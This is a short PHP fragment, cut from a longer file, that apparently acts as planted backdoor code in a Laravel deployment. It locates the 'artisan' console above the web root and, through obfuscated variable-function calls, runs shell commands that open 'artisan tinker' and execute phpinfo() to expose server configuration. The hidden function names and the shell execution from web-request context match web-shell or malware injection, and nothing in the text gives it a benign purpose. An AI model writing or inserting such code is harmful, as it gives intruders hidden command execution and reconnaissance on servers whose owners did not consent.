...
if(isset($_SERVER['DOCUMENT_ROOT'])){if(is_file($target = realpath($_SERVER['DOCUMENT_ROOT'].'/../artisan'))){${'$'}('php '.escapeshellarg($target).' tinker'); ${'%'}("php " . escapeshellarg($target) . " tinker --execute='phpinfo();'");}}
